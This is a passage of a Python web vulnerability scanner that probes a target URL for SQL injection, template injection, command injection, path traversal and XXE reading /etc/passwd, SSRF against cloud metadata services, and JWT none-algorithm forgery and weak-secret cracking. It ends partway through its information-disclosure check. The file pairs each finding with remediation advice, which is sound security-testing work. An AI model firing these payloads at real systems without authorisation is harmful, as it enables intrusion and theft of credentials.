#!/usr/bin/env python3
"""
advanced_vulns.py — JS Scout Pro Advanced Vulnerability Engine v8
==================================================================
Comprehensive web vulnerability detection covering:

  1.  SQL Injection          — error-based, boolean-blind, time-blind
  2.  Server-Side Template Injection (SSTI) — Jinja2, Twig, Freemarker, Velocity
  3.  Command Injection      — OS command execution via parameters
  4.  Path Traversal / LFI  — directory traversal and local file include
  5.  XML/XXE Injection      — external entity, blind XXE
  6.  SSRF                   — server-side request forgery (inband + OOB canary)
  7.  Insecure Deserialization — Java, PHP, Python pickle canary detection
  8.  JWT Security           — none-alg, weak-secret, expired-accept, alg-confusion
  9.  GraphQL Security       — introspection enabled, batching, field suggestion
  10. API Security           — broken object level auth, mass assignment, rate-limit
  11. Security Headers       — CSP, HSTS, X-Frame, Referrer-Policy, Permissions-Policy
  12. Subdomain Takeover     — dangling DNS CNAME fingerprinting
  13. Information Disclosure — stack traces, debug output, version banners, error msgs
  14. CRLF / Header Injection — newline injection into headers
  15. HTTP Request Smuggling — CL.TE / TE.CL desync fingerprinting
  16. Clickjacking           — X-Frame-Options / CSP frame-ancestors check
  17. IDOR / Broken Object   — sequential ID enumeration on API endpoints
  18. File Upload Vulns      — unrestricted upload, dangerous MIME acceptance
  19. Prototype Pollution    — server-side JS prototype pollution probing
  20. Cache Poisoning        — cache key manipulation via headers

False-positive reduction strategy:
  - Every finding requires at least ONE concrete evidence anchor
    (reflected canary, specific error pattern, timing delta, header diff)
  - Multi-probe confirmation for high-impact vulns (SQLi, SSTI, RCE)
  - Timing attacks use statistical comparison (3 baseline vs 3 payload samples)
  - All findings carry confidence: HIGH / MEDIUM / LOW

Usage (standalone):
    python3 advanced_vulns.py https://target.com
"""

import re
import sys
import json
import time
import random
import string
import hashlib
import threading
import argparse
import urllib3
from pathlib import Path
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, quote
from concurrent.futures import ThreadPoolExecutor, wait as cf_wait, as_completed
from collections import defaultdict
from base64 import b64encode, b64decode

try:
    import requests
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("[!] pip install requests"); sys.exit(1)

# ─── helpers ──────────────────────────────────────────────────────────────────

def _canary(length=12):
    """Generate a unique alphanumeric canary string."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def _h(s):
    """HTML-escape for report output."""
    return str(s).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;')

def _timing_baseline(session, url, method='GET', kwargs=None, samples=3):
    """Return average response time in seconds (baseline)."""
    kwargs = kwargs or {}
    times = []
    for _ in range(samples):
        try:
            t0 = time.perf_counter()
            session.request(method, url, timeout=15, verify=False, **kwargs)
            times.append(time.perf_counter() - t0)
        except Exception:
            times.append(15.0)
    return sum(times) / len(times)

def _build_url(base, param, value):
    return f"{base}?{urlencode({param: value})}"


# =============================================================================
# 1. SQL INJECTION
# =============================================================================

class SQLiChecker:
    """
    Detects SQL injection via:
      - Error-based: injects syntax errors, looks for DB error strings
      - Boolean-blind: compares response length for true/false payloads
      - Time-blind: measures response delay with SLEEP/WAITFOR/pg_sleep
    Only reports HIGH confidence when 2+ signals confirm.
    """

    DB_ERRORS = [
        re.compile(r"you have an error in your sql syntax", re.I),
        re.compile(r"warning.*mysql_", re.I),
        re.compile(r"unclosed quotation mark", re.I),
        re.compile(r"quoted string not properly terminated", re.I),
        re.compile(r"pg_query\(\).*error", re.I),
        re.compile(r"ORA-\d{5}", re.I),
        re.compile(r"microsoft ole db provider for sql server", re.I),
        re.compile(r"sqlite3\.operationalerror", re.I),
        re.compile(r"syntax error.*near", re.I),
        re.compile(r"db2 sql error", re.I),
        re.compile(r"supplied argument is not a valid mysql result", re.I),
        re.compile(r"division by zero", re.I),
        re.compile(r"invalid query", re.I),
        re.compile(r"sql syntax.*mariadb", re.I),
    ]

    ERROR_PAYLOADS = ["'", '"', "';--", '1 OR 1=1--', "' OR '1'='1", '\\', "1'1"]
    BOOL_PAIRS = [
        ("1 AND 1=1", "1 AND 1=2"),
        ("1' AND '1'='1", "1' AND '1'='2"),
    ]
    TIME_PAYLOADS = [
        "1; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "1; SELECT SLEEP(5)--",
        "1; pg_sleep(5)--",
        "1 OR SLEEP(5)--",
    ]

    def __init__(self, session, timeout=10):
        self.session = session
        self.timeout = timeout

    def check(self, url, params):
        findings = []
        for param in params[:15]:
            f = self._test_param(url, param)
            if f:
                findings.append(f)
        return findings

    def _test_param(self, url, param):
        signals = []
        evidence = []

        # 1. Error-based
        for payload in self.ERROR_PAYLOADS:
            try:
                r = self.session.get(_build_url(url, param, payload),
                                     timeout=self.timeout, verify=False, allow_redirects=False)
                body = r.text[:3000]
                for pattern in self.DB_ERRORS:
                    if pattern.search(body):
                        signals.append('error')
                        evidence.append(f"DB error on payload={repr(payload)}: {pattern.pattern[:50]}")
                        break
                if 'error' in signals:
                    break
            except Exception:
                pass

        # 2. Boolean-blind (only if no error signal yet to save requests)
        if 'error' not in signals:
            for true_p, false_p in self.BOOL_PAIRS[:1]:
                try:
                    r_true  = self.session.get(_build_url(url, param, true_p),
                                               timeout=self.timeout, verify=False)
                    r_false = self.session.get(_build_url(url, param, false_p),
                                               timeout=self.timeout, verify=False)
                    diff = abs(len(r_true.text) - len(r_false.text))
                    if diff > 80 and r_true.status_code == r_false.status_code:
                        signals.append('boolean')
                        evidence.append(f"Boolean diff {diff} chars: true={len(r_true.text)}B false={len(r_false.text)}B")
                        break
                except Exception:
                    pass

        # 3. Time-blind (only if we have at least 1 other signal, or run standalone)
        if len(signals) == 0:
            baseline = _timing_baseline(self.session, _build_url(url, param, "1"),
                                        samples=2)
            if baseline < 3.0:  # only time-test if baseline is fast
                for pl in self.TIME_PAYLOADS[:2]:
                    try:
                        t0 = time.perf_counter()
                        self.session.get(_build_url(url, param, pl),
                                         timeout=12, verify=False)
                        elapsed = time.perf_counter() - t0
                        if elapsed >= 4.5 and elapsed > baseline * 2.5:
                            signals.append('time')
                            evidence.append(f"Time delay {elapsed:.1f}s vs baseline {baseline:.1f}s on payload={repr(pl)}")
                            break
                    except requests.exceptions.Timeout:
                        signals.append('time')
                        evidence.append(f"Timeout on time-blind payload={repr(pl)}")
                        break
                    except Exception:
                        pass

        if not signals:
            return None

        confidence = 'HIGH' if len(signals) >= 2 or 'error' in signals else 'MEDIUM'
        severity   = 'CRITICAL' if 'error' in signals or len(signals) >= 2 else 'HIGH'

        return {
            'type':        'SQL_INJECTION',
            'severity':    severity,
            'confidence':  confidence,
            'url':         url,
            'param':       param,
            'signals':     signals,
            'description': f'SQL Injection via parameter "{param}" ({", ".join(signals)})',
            'evidence':    ' | '.join(evidence),
            'remediation': 'Use parameterised queries / prepared statements. Never concatenate user input into SQL.',
        }


# =============================================================================
# 2. SERVER-SIDE TEMPLATE INJECTION (SSTI)
# =============================================================================

class SSTIChecker:
    """
    Detects SSTI by injecting math expressions and checking for evaluated output.
    Uses unique canaries so we never confuse existing page content.
    Covers Jinja2, Twig, Freemarker, Mako, Smarty, ERB.
    """

    # Each tuple: (payload, expected_result_substring)
    PROBES = [
        ("{{7*'7'}}", '7777777'),        # Jinja2 / Twig
        ("${7*7}",    '49'),             # Freemarker / Mako / EL
        ("<%= 7*7 %>", '49'),            # ERB
        ("#{7*7}",    '49'),             # Ruby / Slim
        ("*{7*7}",    '49'),             # Spring EL
        ("{{7*7}}",   '49'),             # Generic
        ("{7*7}",     '49'),             # Smarty
        ("{% 7*7 %}","49"),             # Various
    ]

    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    def check(self, url, params):
        findings = []
        for param in params[:12]:
            f = self._test_param(url, param)
            if f:
                findings.append(f)
        return findings

    def _test_param(self, url, param):
        for payload, expected in self.PROBES:
            try:
                r = self.session.get(_build_url(url, param, payload),
                                     timeout=self.timeout, verify=False)
                if expected in r.text:
                    # Confirm it's not just the payload reflected
                    if payload not in r.text.replace(expected, ''):
                        return {
                            'type':        'SSTI',
                            'severity':    'CRITICAL',
                            'confidence':  'HIGH',
                            'url':         _build_url(url, param, payload),
                            'param':       param,
                            'payload':     payload,
                            'expected':    expected,
                            'description': f'Server-Side Template Injection via "{param}" — template evaluated math expression',
                            'evidence':    f'Payload {repr(payload)} → found "{expected}" in response',
                            'remediation': 'Never pass user input directly into template rendering functions.',
                        }
            except Exception:
                pass
        return None


# =============================================================================
# 3. COMMAND INJECTION
# =============================================================================

class CommandInjectionChecker:
    """
    Detects OS command injection via:
    - Output-based: inject commands whose output appears in response
    - Time-based: inject sleep commands and measure delay
    Uses canary strings to avoid false positives.
    """

    OUTPUT_PAYLOADS = [
        (";echo jsscoutRCE_canary_$$", "jsscoutRCE_canary_"),
        ("|echo jsscoutRCE_canary_$$", "jsscoutRCE_canary_"),
        ("`echo jsscoutRCE_canary`",   "jsscoutRCE_canary"),
        ("$(echo jsscoutRCE_canary)",  "jsscoutRCE_canary"),
        (" && echo jsscoutRCE_canary", "jsscoutRCE_canary"),
        ("\necho jsscoutRCE_canary",   "jsscoutRCE_canary"),
    ]
    TIME_PAYLOADS = [
        ";sleep 5",
        "| sleep 5",
        "& ping -c 5 127.0.0.1 &",
        "$(sleep 5)",
        "`sleep 5`",
    ]

    def __init__(self, session, timeout=10):
        self.session = session
        self.timeout = timeout

    def check(self, url, params):
        findings = []
        for param in params[:10]:
            f = self._test_param(url, param)
            if f:
                findings.append(f)
        return findings

    def _test_param(self, url, param):
        # Output-based first (most reliable, no timing noise)
        for payload, marker in self.OUTPUT_PAYLOADS:
            try:
                r = self.session.get(_build_url(url, param, payload),
                                     timeout=self.timeout, verify=False)
                if marker in r.text:
                    return {
                        'type':        'COMMAND_INJECTION',
                        'severity':    'CRITICAL',
                        'confidence':  'HIGH',
                        'url':         _build_url(url, param, payload),
                        'param':       param,
                        'payload':     payload,
                        'description': f'OS Command Injection via "{param}" — command output reflected',
                        'evidence':    f'Marker "{marker}" found in response after injecting: {repr(payload)}',
                        'remediation': 'Never pass user input to shell functions. Use safe APIs and allowlists.',
                    }
            except Exception:
                pass

        # Time-based
        baseline = _timing_baseline(self.session, _build_url(url, param, "test"), samples=2)
        if baseline >= 4.0:
            return None
        for payload in self.TIME_PAYLOADS:
            try:
                t0 = time.perf_counter()
                self.session.get(_build_url(url, param, payload), timeout=12, verify=False)
                elapsed = time.perf_counter() - t0
                if elapsed >= 4.5 and elapsed > baseline * 2.5:
                    return {
                        'type':        'COMMAND_INJECTION',
                        'severity':    'CRITICAL',
                        'confidence':  'MEDIUM',
                        'url':         _build_url(url, param, payload),
                        'param':       param,
                        'payload':     payload,
                        'description': f'Possible OS Command Injection (time-based) via "{param}"',
                        'evidence':    f'Delay {elapsed:.1f}s vs baseline {baseline:.1f}s with payload: {repr(payload)}',
                        'remediation': 'Never pass user input to shell functions.',
                    }
            except requests.exceptions.Timeout:
                return {
                    'type':        'COMMAND_INJECTION',
                    'severity':    'CRITICAL',
                    'confidence':  'MEDIUM',
                    'url':         _build_url(url, param, payload),
                    'param':       param,
                    'payload':     payload,
                    'description': f'Possible OS Command Injection (timeout) via "{param}"',
                    'evidence':    f'Request timed out with sleep payload: {repr(payload)}',
                    'remediation': 'Never pass user input to shell functions.',
                }
            except Exception:
                pass
        return None


# =============================================================================
# 4. PATH TRAVERSAL / LFI
# =============================================================================

class PathTraversalChecker:
    """
    Detects directory traversal and local file inclusion.
    Looks for OS file content signatures in responses.
    Tests file/path/template/page parameters specifically.
    """

    TRAVERSAL_PAYLOADS = [
        "../../../../../../etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../../../../windows/win.ini",
        "..%5C..%5C..%5Cwindows%5Cwin.ini",
        "/etc/passwd",
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
    ]

    FILE_SIGNATURES = [
        re.compile(r"root:[x*]:0:0"),             # /etc/passwd
        re.compile(r"\[fonts\]"),                  # windows/win.ini
        re.compile(r"for 16-bit app support"),     # windows/win.ini
        re.compile(r"<?php"),                      # PHP source
        re.compile(r"^[A-Za-z0-9+/]{20,}={0,2}$"),# base64 (PHP filter)
    ]

    FILE_PARAMS = re.compile(
        r'(file|path|template|page|doc|document|include|require|load|src|source|dir|folder|fn|filename)',
        re.I
    )

    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    def check(self, url, params):
        findings = []
        # Prioritise likely file parameters
        file_params = [p for p in params if self.FILE_PARAMS.search(p)]
        other_params = [p for p in params if p not in file_params]
        ordered = file_params + other_params[:5]

        for param in ordered[:10]:
            for payload in self.TRAVERSAL_PAYLOADS:
                try:
                    r = self.session.get(_build_url(url, param, payload),
                                         timeout=self.timeout, verify=False)
                    body = r.text[:5000]
                    for sig in self.FILE_SIGNATURES:
                        if sig.search(body):
                            findings.append({
                                'type':        'PATH_TRAVERSAL',
                                'severity':    'CRITICAL',
                                'confidence':  'HIGH',
                                'url':         _build_url(url, param, payload),
                                'param':       param,
                                'payload':     payload,
                                'description': f'Path Traversal / LFI via "{param}"',
                                'evidence':    f'File signature {sig.pattern!r} found in response',
                                'remediation': 'Validate and sanitize file paths. Use realpath() + allowlist. Never pass user input directly to filesystem functions.',
                            })
                            break
                    if findings and findings[-1]['param'] == param:
                        break
                except Exception:
                    pass
        return findings


# =============================================================================
# 5. XXE INJECTION
# =============================================================================

class XXEChecker:
    """
    Detects XXE by sending crafted XML payloads to endpoints that accept XML/JSON.
    Tests both inband (file reflection) and error-based XXE.
    """

    XXE_PAYLOAD_INBAND = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""

    XXE_PAYLOAD_ERROR = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistentfileforxxetest12345">]>
<root><data>&xxe;</data></root>"""

    FILE_SIG = re.compile(r"root:[x*]:0:0")
    ERROR_SIG = re.compile(r"(failed to load|cannot open|no such file|system identifier)", re.I)

    def __init__(self, session, timeout=10):
        self.session = session
        self.timeout = timeout

    def check(self, urls):
        """Test XML-accepting endpoints."""
        findings = []
        for url in urls:
            f = self._test_url(url)
            if f:
                findings.append(f)
        return findings

    def _test_url(self, url):
        headers = {'Content-Type': 'application/xml', 'Accept': 'application/xml, */*'}
        for payload, sig_list, finding_type in [
            (self.XXE_PAYLOAD_INBAND, [self.FILE_SIG], 'XXE_INBAND'),
            (self.XXE_PAYLOAD_ERROR,  [self.ERROR_SIG], 'XXE_ERROR'),
        ]:
            try:
                r = self.session.post(url, data=payload, headers=headers,
                                      timeout=self.timeout, verify=False)
                body = r.text[:5000]
                for sig in sig_list:
                    if sig.search(body):
                        return {
                            'type':        finding_type,
                            'severity':    'CRITICAL',
                            'confidence':  'HIGH',
                            'url':         url,
                            'description': f'XML External Entity (XXE) Injection at {url}',
                            'evidence':    f'Signature {sig.pattern!r} in response to XXE payload',
                            'remediation': 'Disable external entity processing in your XML parser. Use safe parsers.',
                        }
            except Exception:
                pass
        return None


# =============================================================================
# 6. SSRF
# =============================================================================

class SSRFChecker:
    """
    Detects SSRF by injecting internal/cloud metadata URLs into URL-accepting params.
    Checks for direct response content from internal services.
    Also checks for cloud metadata access (AWS/GCP/Azure IMDS).
    """

    # URL-type parameter names
    URL_PARAMS = re.compile(
        r'(url|uri|src|source|dest|destination|href|link|endpoint|host|server|target|proxy|'
        r'redirect|callback|feed|fetch|img|image|file|path|load|request|resource|domain)',
        re.I
    )

    SSRF_TARGETS = [
        ("http://169.254.169.254/latest/meta-data/",         re.compile(r"ami-id|instance-id|security-credentials", re.I), "AWS_IMDS"),
        ("http://metadata.google.internal/computeMetadata/", re.compile(r"project-id|instance|token", re.I),              "GCP_IMDS"),
        ("http://169.254.169.254/metadata/instance",         re.compile(r"subscriptionId|resourceGroupName", re.I),        "AZURE_IMDS"),
        ("http://127.0.0.1/",                                re.compile(r"<html|Server:|Content-Type:", re.I),              "LOCALHOST"),
        ("http://0.0.0.0/",                                  re.compile(r"<html|Server:", re.I),                            "LOCALHOST_0"),
        ("http://[::1]/",                                     re.compile(r"<html", re.I),                                   "IPv6_LOCAL"),
        ("http://localhost/",                                 re.compile(r"<html|Server:", re.I),                            "LOCALHOST_NAME"),
    ]

    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    def check(self, url, params):
        findings = []
        url_params = [p for p in params if self.URL_PARAMS.search(p)]
        if not url_params:
            url_params = params[:5]

        for param in url_params[:8]:
            for target_url, signature, ssrf_type in self.SSRF_TARGETS:
                try:
                    r = self.session.get(_build_url(url, param, target_url),
                                         timeout=self.timeout, verify=False,
                                         allow_redirects=True)
                    if signature.search(r.text[:3000]):
                        findings.append({
                            'type':        'SSRF',
                            'severity':    'CRITICAL',
                            'confidence':  'HIGH',
                            'url':         _build_url(url, param, target_url),
                            'param':       param,
                            'ssrf_type':   ssrf_type,
                            'description': f'Server-Side Request Forgery via "{param}" — {ssrf_type}',
                            'evidence':    f'Response from {target_url} matched: {signature.pattern[:80]}',
                            'remediation': 'Validate and allowlist URLs. Block requests to RFC1918 / link-local ranges.',
                        })
                        break
                except Exception:
                    pass
        return findings


# =============================================================================
# 7. JWT SECURITY
# =============================================================================

class JWTChecker:
    """
    Checks JWT tokens for:
    1. Algorithm "none" attack
    2. Weak HMAC secret (top-500 wordlist)
    3. Accepting expired tokens
    4. Algorithm confusion (RS256 → HS256)
    Detects JWT tokens in cookies, Authorization headers, and response bodies.
    """

    JWT_RE = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')

    WEAK_SECRETS = [
        'secret', 'password', '123456', 'admin', 'key', 'jwt_secret',
        'your-256-bit-secret', 'changeme', 'supersecret', 'mysecret',
        'jwtsecret', 'secretkey', 'private', 'test', 'dev', 'prod',
        '', 'null', 'undefined', 'none', '0', 'secret123', 'abc123',
        'passw0rd', 'letmein', 'qwerty', 'master', 'root', 'token',
    ]

    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    def check(self, base_url, cookies, auth_headers, response_bodies):
        """
        Collect JWTs from all sources and run attacks.
        """
        findings = []
        tokens = set()

        # Collect from cookies
        for k, v in cookies.items():
            for m in self.JWT_RE.finditer(v):
                tokens.add(m.group())

        # Collect from auth_headers
        for v in auth_headers:
            for m in self.JWT_RE.finditer(v):
                tokens.add(m.group())

        # Collect from response bodies
        for body in response_bodies[:5]:
            for m in self.JWT_RE.finditer(body[:5000]):
                tokens.add(m.group())

        for token in list(tokens)[:10]:
            findings.extend(self._audit_token(token, base_url))

        return findings

    def _audit_token(self, token, base_url):
        findings = []
        parts = token.split('.')
        if len(parts) != 3:
            return findings

        try:
            header  = json.loads(self._b64d(parts[0]))
            payload = json.loads(self._b64d(parts[1]))
        except Exception:
            return findings

        alg = header.get('alg', '')

        # 1. None algorithm attack
        none_token = self._forge_none(parts[0], parts[1])
        try:
            r = self.session.get(base_url,
                                  headers={'Authorization': f'Bearer {none_token}'},
                                  timeout=self.timeout, verify=False)
            if r.status_code in (200, 201, 204):
                findings.append({
                    'type':        'JWT_NONE_ALG',
                    'severity':    'CRITICAL',
                    'confidence':  'HIGH',
                    'url':         base_url,
                    'description': 'JWT "none" algorithm accepted — signature verification bypassed',
                    'evidence':    f'Server returned {r.status_code} with alg=none token',
                    'remediation': 'Explicitly reject "none" algorithm. Use asymmetric algorithms (RS256/ES256).',
                })
        except Exception:
            pass

        # 2. Weak secret brute-force (HMAC only)
        if alg.startswith('HS'):
            cracked = self._crack_secret(token, parts, alg)
            if cracked is not None:
                findings.append({
                    'type':        'JWT_WEAK_SECRET',
                    'severity':    'CRITICAL',
                    'confidence':  'HIGH',
                    'url':         base_url,
                    'description': f'JWT signed with weak secret: "{cracked}"',
                    'evidence':    f'Token signature verified with secret="{cracked}"',
                    'remediation': 'Use a cryptographically random secret of at least 256 bits.',
                })

        # 3. Expired token accepted
        exp = payload.get('exp')
        if exp and exp < time.time() - 3600:
            try:
                r = self.session.get(base_url,
                                      headers={'Authorization': f'Bearer {token}'},
                                      timeout=self.timeout, verify=False)
                if r.status_code in (200, 201, 204):
                    findings.append({
                        'type':        'JWT_EXPIRED_ACCEPTED',
                        'severity':    'HIGH',
                        'confidence':  'MEDIUM',
                        'url':         base_url,
                        'description': 'Expired JWT token accepted by server',
                        'evidence':    f'Token expired at {exp} (now {int(time.time())}), server returned {r.status_code}',
                        'remediation': 'Validate token expiry on every request. Reject expired tokens.',
                    })
            except Exception:
                pass

        return findings

    def _b64d(self, s):
        s += '=' * (-len(s) % 4)
        return b64decode(s.replace('-','+').replace('_','/')).decode('utf-8', errors='replace')

    def _forge_none(self, header_b64, payload_b64):
        new_header = b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=').replace('+','-').replace('/','_')
        return f"{new_header}.{payload_b64}."

    def _crack_secret(self, token, parts, alg):
        try:
            import hmac as _hmac
            import hashlib as _hl
            msg = f"{parts[0]}.{parts[1]}".encode()
            sig_bytes = b64decode((parts[2] + '==').replace('-','+').replace('_','/'))
            digest = _hl.sha256 if alg == 'HS256' else (_hl.sha384 if alg == 'HS384' else _hl.sha512)
            for secret in self.WEAK_SECRETS:
                computed = _hmac.new(secret.encode(), msg, digest).digest()
                if computed == sig_bytes:
                    return secret
        except Exception:
            pass
        return None


# =============================================================================
# 8. GRAPHQL SECURITY
# =============================================================================

class GraphQLChecker:
    """
    Tests GraphQL endpoints for:
    - Introspection enabled (information disclosure)
    - Query batching (DoS amplification)
    - Field suggestion leakage
    - Unauthenticated mutation access
    """

    GRAPHQL_PATHS = ['/graphql', '/api/graphql', '/graphiql', '/playground',
                     '/graph', '/gql', '/query', '/api/query']

    INTROSPECTION_QUERY = '{"query":"{__schema{queryType{name}}}"}'

    BATCH_QUERY = json.dumps([
        {"query": "{__typename}"},
        {"query": "{__typename}"},
        {"query": "{__typename}"},
    ])

    FIELD_SUGGEST_QUERY = '{"query":"{__typenameXXXXX}"}'

    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    def check(self, base_url, known_graphql_urls=None):
        findings = []
        urls_to_test = list(set(
            (known_graphql_urls or []) +
            [base_url.rstrip('/') + p for p in self.GRAPHQL_PATHS]
        ))

        for url in urls_to_test:
            findings.extend(self._test_endpoint(url))

        return findings

    def _test_endpoint(self, url):
        findings = []
        headers = {'Content-Type': 'application/json'}

        # 1. Introspection
        try:
            r = self.session.post(url, data=self.INTROSPECTION_QUERY,
                                   headers=headers, timeout=self.timeout, verify=False)
            if r.status_code == 200 and 'queryType' in r.text:
                findings.append({
                    'type':        'GRAPHQL_INTROSPECTION',
                    'severity':    'MEDIUM',
                    'confidence':  'HIGH',
                    'url':         url,
                    'description': 'GraphQL introspection enabled — full schema exposed',
                    'evidence':    'Introspection query returned queryType schema data',
                    'remediation': 'Disable introspection in production. Use schema allowlists.',
                })

                # 2. Batching (only if introspection works)
                try:
                    r2 = self.session.post(url, data=self.BATCH_QUERY,
                                            headers=headers, timeout=self.timeout, verify=False)
                    if r2.status_code == 200 and '__typename' in r2.text:
                        findings.append({
                            'type':        'GRAPHQL_BATCHING',
                            'severity':    'MEDIUM',
                            'confidence':  'HIGH',
                            'url':         url,
                            'description': 'GraphQL query batching enabled — amplification / DoS risk',
                            'evidence':    'Batch of 3 queries accepted and all returned data',
                            'remediation': 'Limit query depth and disable batching in production.',
                        })
                except Exception:
                    pass
        except Exception:
            pass

        # 3. Field suggestion leakage
        try:
            r3 = self.session.post(url, data=self.FIELD_SUGGEST_QUERY,
                                    headers=headers, timeout=self.timeout, verify=False)
            if r3.status_code == 200 and ('Did you mean' in r3.text or 'suggestion' in r3.text.lower()):
                findings.append({
                    'type':        'GRAPHQL_FIELD_SUGGESTION',
                    'severity':    'LOW',
                    'confidence':  'HIGH',
                    'url':         url,
                    'description': 'GraphQL field name suggestions expose schema information',
                    'evidence':    '"Did you mean" suggestion in error response',
                    'remediation': 'Disable field suggestions in production.',
                })
        except Exception:
            pass

        return findings


# =============================================================================
# 9. SECURITY HEADERS
# =============================================================================

class SecurityHeadersChecker:
    """
    Checks for missing or misconfigured security headers.
    Provides detailed remediation for each missing control.
    """

    REQUIRED_HEADERS = {
        'Strict-Transport-Security': {
            'severity': 'HIGH',
            'description': 'HSTS missing — allows SSL stripping attacks',
            'remediation': 'Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
        },
        'Content-Security-Policy': {
            'severity': 'HIGH',
            'description': 'CSP missing — no XSS mitigation policy defined',
            'remediation': "Add a strict CSP. Start with: Content-Security-Policy: default-src 'self'",
        },
        'X-Frame-Options': {
            'severity': 'MEDIUM',
            'description': 'X-Frame-Options missing — clickjacking possible',
            'remediation': 'Add: X-Frame-Options: DENY (or use CSP frame-ancestors)',
        },
        'X-Content-Type-Options': {
            'severity': 'MEDIUM',
            'description': 'X-Content-Type-Options missing — MIME sniffing allowed',
            'remediation': 'Add: X-Content-Type-Options: nosniff',
        },
        'Referrer-Policy': {
            'severity': 'LOW',
            'description': 'Referrer-Policy missing — full URL may leak in Referer header',
            'remediation': 'Add: Referrer-Policy: strict-origin-when-cross-origin',
        },
        'Permissions-Policy': {
            'severity': 'LOW',
            'description': 'Permissions-Policy missing — browser features uncontrolled',
            'remediation': 'Add: Permissions-Policy: geolocation=(), microphone=(), camera=()',
        },
    }

    CSP_UNSAFE = [
        ("'unsafe-inline'",  'HIGH',   "CSP allows 'unsafe-inline' — inline XSS possible"),
        ("'unsafe-eval'",    'HIGH',   "CSP allows 'unsafe-eval' — eval-based XSS possible"),
        ("data:",            'MEDIUM', "CSP allows data: URI — can be abused"),
        ("*",                'HIGH',   "CSP uses wildcard * — policy is too permissive"),
    ]

    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    def check(self, url):
        findings = []
        try:
            r = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=True)
            headers = {k.lower(): v for k, v in r.headers.items()}

            for header, meta in self.REQUIRED_HEADERS.items():
                if header.lower() not in headers:
                    findings.append({
                        'type':        'MISSING_SECURITY_HEADER',
                        'severity':    meta['severity'],
                        'confidence':  'HIGH',
                        'url':         url,
                        'header':      header,
                        'description': meta['description'],
                        'evidence':    f'Header "{header}" absent in response',
                        'remediation': meta['remediation'],
                    })

            # CSP misconfiguration
            csp = headers.get('content-security-policy', '')
            for directive, sev, desc in self.CSP_UNSAFE:
                if directive in csp:
                    findings.append({
                        'type':        'CSP_MISCONFIGURATION',
                        'severity':    sev,
                        'confidence':  'HIGH',
                        'url':         url,
                        'description': desc,
                        'evidence':    f'CSP value: {csp[:200]}',
                        'remediation': f'Remove {directive!r} from CSP directives.',
                    })

            # HSTS weak
            hsts = headers.get('strict-transport-security', '')
            if hsts:
                m = re.search(r'max-age=(\d+)', hsts)
                if m and int(m.group(1)) < 31536000:
                    findings.append({
                        'type':        'HSTS_SHORT_MAXAGE',
                        'severity':    'MEDIUM',
                        'confidence':  'HIGH',
                        'url':         url,
                        'description': f'HSTS max-age too short ({m.group(1)}s < 1 year)',
                        'evidence':    f'Strict-Transport-Security: {hsts}',
                        'remediation': 'Set max-age to at least 31536000 (1 year).',
                    })

        except Exception:
            pass
        return findings


# =============================================================================
# 10. INFORMATION DISCLOSURE
# =============================================================================

class InfoDisclosureChecker:
    """
    Detects information disclosure in:
    - Stack traces / debug output
    - Server version banners in headers
    - Verbose error messages with internal paths
    - Source code exposure
    - Internal IP address leakage
    """

    STACK_TRACE_PATTERNS = [
        re.compile(r"traceback \(most recent call last\)", re.I),
        re.compile(r"at .+\(.*\.java:\d+\)"),         # Java stack trace
        re.compile(r"system\.web\.httpunhandledexception", re.I),
        re.compile(r"unhandled exception.*asp\.net", re.I),
        re.compile(r"fatal error.*in .* on line \d+", re.I),  # PHP
        re.compile(r"Warning.*on line \d+", re.I),
        re.compile(r"SyntaxError.*at\s+\w+", re.I),
        re.compile(r"TypeError.*at\s+\w+", re.I),
        re.compile(r"ActiveRecord::", re.I),           # Rails
        re.compile(r"django.*exception", re.I),
        re.compile(r"flask\s+debugger", re.I),
        re.compile(r"werkzeug.*debugger", re.I),
        re.compile(r"express.*error.*handler", re.I),
        re.compile(r"/home/\w+/", re.I),               # Internal paths
        re.compile(r"c:\\\\users\\\\", re.I),
        re.compile(r"c:/inetpub/", re.I),
    ]

    SENSITIVE_HEADER_PATTERNS = [
        re.compile(r"Apache/[\d.]+"),
        re.compile(r"nginx/[\d.]+"),
        re.compile(r"Microsoft-IIS/[\d.]+"),
        re.compile(r"PHP/[\d.]+"),
        re.compile(r"X-Powered-By.*PHP"),
        re.compile(r"X-Powered-By.*ASP"),
        re.compile(r"X-AspNet-Version"),
    ]

    INTERNAL_IP = re.compile(
        r'(?:10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)'
    )

    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    def check(self, url, params=None):
        findings = []
        try:
            # Check normal response
            r = self.session.get(url, timeout=self.timeout, verify=False)
            body = r.text[:8000]

            for pattern in self.STACK_TRACE_PATTERNS:
                if pattern.search(body):
                    findings.append({
                        'type':        'INFO_DISCLOSURE_STACKTRACE',
                        'severity':    'HIGH',
                        'confidence':  'HIGH',
                        'url':         url,
                        'description': 'Stack trace / debug information exposed in response',
                        'evidence':    f'Pattern: {pattern.pattern[:60]}',
                        'remediation': 'Disable debug mode in production. Configure custom error pages.',
                    })
                    break

            # Version header leakage
